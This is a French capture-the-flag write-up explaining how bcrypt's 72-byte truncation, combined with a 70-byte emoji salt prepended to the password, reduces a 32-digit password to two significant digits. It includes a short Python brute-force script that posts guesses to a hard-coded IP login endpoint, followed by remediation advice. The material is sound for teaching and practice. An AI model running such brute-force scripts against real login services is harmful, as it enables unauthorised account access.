
# 🛡️ Analyse complète d’une vulnérabilité liée à `bcrypt` et la concaténation salt + mot de passe

---

## 📌 Contexte

L'application Flask ci-dessous enregistre des utilisateurs via `/register` et les authentifie via `/login` :

### 🧱 Structure concernée :


`salt = generate_salt()  # 12 emojis concaténés avec 'aa' random_password = ''.join(random.choice(NUMBERS) for _ in range(32)) password_hash = bcrypt.hashpw((salt + random_password).encode("utf-8"), bcrypt.gensalt())`

Lors de la connexion :

`bcrypt.checkpw((salt + password).encode("utf-8"), stored_hash)`

---

## 🔐 Fonctionnement de bcrypt et sa **limite de 72 octets**

### ⚠️ Caractéristique technique fondamentale :

- **bcrypt tronque silencieusement toute donnée après 72 octets**
    
- Cela signifie que si tu passes une chaîne de plus de 72 octets (bytes), **seuls les 72 premiers seront pris en compte dans le hash**
    

> 📚 **Source officielle :** OpenBSD bcrypt(3) man page
> 
> > _"Only the first 72 bytes of the password are used. Any additional bytes are ignored."_

---

## 🧪 Analyse du `salt` et du `mot de passe` dans le code

### 🔣 Le salt :

`def generate_salt():     return 'aa'.join(random.choices(EMOJIS, k=12))`

#### ➕ Ce que cela génère :

- 12 émojis, chacun suivi de `'aa'`, soit 11 fois + `'aa'` final
    
- Exemple de salt : `'🍁aa🍄aa🎵aa...😀aa'`
    

#### 🧮 Taille en octets :

- Un emoji en UTF-8 = **4 octets**
    
- `'a'` = 1 octet → `'aa'` = 2 octets
    

|Élément|Quantité|Taille unitaire|Total|
|---|---|---|---|
|Emojis|12|4 octets|48 octets|
|'aa' chaînes|11 × 2 + 1 × 2 = 22 caractères|1 octet chacun|22 octets|
|**Total**|—|—|**70 octets** ✅|

---

### 🔢 Le mot de passe :

`random_password = ''.join(random.choice(NUMBERS) for _ in range(32))`

- 32 chiffres choisis dans `'0123456789'`
    
- Un chiffre = 1 octet → 32 octets théoriques
    

---

## 🔧 Problème causé par la limite de 72 octets

### ➡️ Concaténation :

python

CopyEdit

`(salt + password).encode('utf-8')`

|Élément|Taille (octets)|
|---|---|
|Salt|70|
|Password|?|
|**Total max pris en compte par bcrypt**|72|

> ✅ Donc bcrypt ne prendra que **les 2 premiers octets** du mot de passe réel.

### 🧨 Conséquence :

Même si le mot de passe réel contient 32 chiffres, **seuls les deux premiers sont significatifs** pour la vérification avec `bcrypt.checkpw`.

---

## 🧰 Exploitation de la faille

### 🎯 Objectif :

Faire du bruteforce sur **les deux premiers chiffres** (100 combinaisons possibles)

### ✅ Code efficace :

python

CopyEdit

`import requests  url = "http://52.188.82.43:8060/login" NUMBERS = '0123456789'  for i in NUMBERS:     for j in NUMBERS:         pwd = i + j         r = requests.post(url, data={"username": "uramix", "password": pwd})         if "squ1rrel{" in r.text:             print(f"[+] Password found: {pwd}")             print(r.text)             break         else:             print(f"{pwd} is not correct")`

---

## 🧠 Pourquoi ce code fonctionne

- Le `register` a généré un hash bcrypt de `salt + 32 chiffres`, mais **le hash ne prend que les 72 premiers octets**
    
- Puisque le salt occupe déjà 70 octets, **le mot de passe utile est réduit à ses 2 premiers chiffres**
    
- En bruteforçant 00 à 99, on finit par retrouver les bons deux chiffres initiaux
    

---

## 📌 Résumé

|Élément|Contenu|Taille|Prise en compte par bcrypt|
|---|---|---|---|
|Salt|12 emojis + 22 caractères|70 octets|✅|
|Password|32 chiffres (ex: `928475...`)|32 octets|❌ (seuls les 2 premiers)|
|Total|102 octets|🔻 Tronqué à 72|✅|

---

## 🧾 Notes complémentaires

### ✅ Est-ce que bcrypt a **toujours** cette limite ?

> Oui, **toutes les implémentations standard de bcrypt** imposent cette **limite de 72 octets**, car c’est une contrainte du **format Blowfish sous-jacent**.

### 🔎 Comment se protéger ?

1. Ne jamais concaténer `salt + password` **manuellement**
    
2. Utiliser des schémas standard :
    
    - stocker séparément salt et password
        
    - utiliser des fonctions comme `bcrypt.hashpw(password.encode(), bcrypt.gensalt())`
        

### 🔥 Pourquoi c’est une vulnérabilité ?

- Une **erreur de conception** côté développeur a permis d’introduire une faille de troncature
    
- Un attaquant peut **réduire l’espace de recherche du mot de passe** de `10^32` à `10^2`
    

---




